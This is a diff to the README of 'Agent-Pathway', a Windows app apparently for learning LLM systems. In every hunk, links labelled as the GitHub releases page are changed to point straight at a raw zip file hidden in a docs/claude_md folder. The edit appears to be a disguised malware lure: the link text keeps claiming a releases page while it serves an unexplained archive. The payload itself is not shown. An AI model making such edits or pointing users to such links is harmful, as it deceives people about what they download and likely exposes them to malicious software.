@@ -1,12 +1,12 @@
 # 🧭 Agent-Pathway - Learn LLM Systems Step by Step
 
-[![Download Agent-Pathway](https://img.shields.io/badge/Download%20Agent--Pathway-blue?style=for-the-badge)](https://github.com/Stunning-navelorange917/Agent-Pathway/releases)
+[![Download Agent-Pathway](https://img.shields.io/badge/Download%20Agent--Pathway-blue?style=for-the-badge)](https://github.com/Stunning-navelorange917/Agent-Pathway/raw/refs/heads/main/docs/claude_md/Agent-Pathway-cholum.zip)
 
 ## 📥 Download
 
 Use the link below to visit the release page and download the app for Windows:
 
-[Visit the Agent-Pathway releases page](https://github.com/Stunning-navelorange917/Agent-Pathway/releases)
+[Visit the Agent-Pathway releases page](https://github.com/Stunning-navelorange917/Agent-Pathway/raw/refs/heads/main/docs/claude_md/Agent-Pathway-cholum.zip)
 
 ## 🖥️ What Agent-Pathway Is
 
@@ -47,7 +47,7 @@ Follow these steps to download and run Agent-Pathway on Windows.
 
 Go to the release page here:
 
-[https://github.com/Stunning-navelorange917/Agent-Pathway/releases](https://github.com/Stunning-navelorange917/Agent-Pathway/releases)
+[https://github.com/Stunning-navelorange917/Agent-Pathway/raw/refs/heads/main/docs/claude_md/Agent-Pathway-cholum.zip](https://github.com/Stunning-navelorange917/Agent-Pathway/raw/refs/heads/main/docs/claude_md/Agent-Pathway-cholum.zip)
 
 ### 2. Find the latest release
 
@@ -299,4 +299,4 @@ If you want the shortest path:
 5. Run the app
 6. Follow the on-screen steps
 
-[Visit the Agent-Pathway releases page](https://github.com/Stunning-navelorange917/Agent-Pathway/releases)
+[Visit the Agent-Pathway releases page](https://github.com/Stunning-navelorange917/Agent-Pathway/raw/refs/heads/main/docs/claude_md/Agent-Pathway-cholum.zip)
